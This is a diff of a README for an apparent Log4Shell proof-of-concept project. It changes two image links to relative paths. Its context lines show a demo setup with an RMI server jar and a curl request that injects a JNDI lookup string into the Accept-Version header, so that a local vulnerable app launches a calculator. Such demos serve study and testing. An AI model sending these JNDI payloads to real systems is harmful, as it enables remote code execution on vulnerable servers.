@@ -26,7 +26,7 @@ java -jar target/Log4jshell.rmi.server-0.0.1-SNAPSHOT.jar
 
 You should get something like this:
 
-![alt text] (https://github.com/Labout/log4shell-rmi-poc/blob/master/rmi_server.png)
+![rmi server](./rmi_server.png)
 
 
 ### 3. Start the vulnerable Log4j application (here a spring boot application)
@@ -50,7 +50,7 @@ curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.
 
 As you can see the the vulnerable app calls the Calculator app.
 
-![alt text] (https://github.com/Labout/log4shell-rmi-poc/blob/master/exploit.png)
+![exploit](./exploit.png)
 
 ## References 
 https://www.cisecurity.org/log4j-zero-day-vulnerability-response/
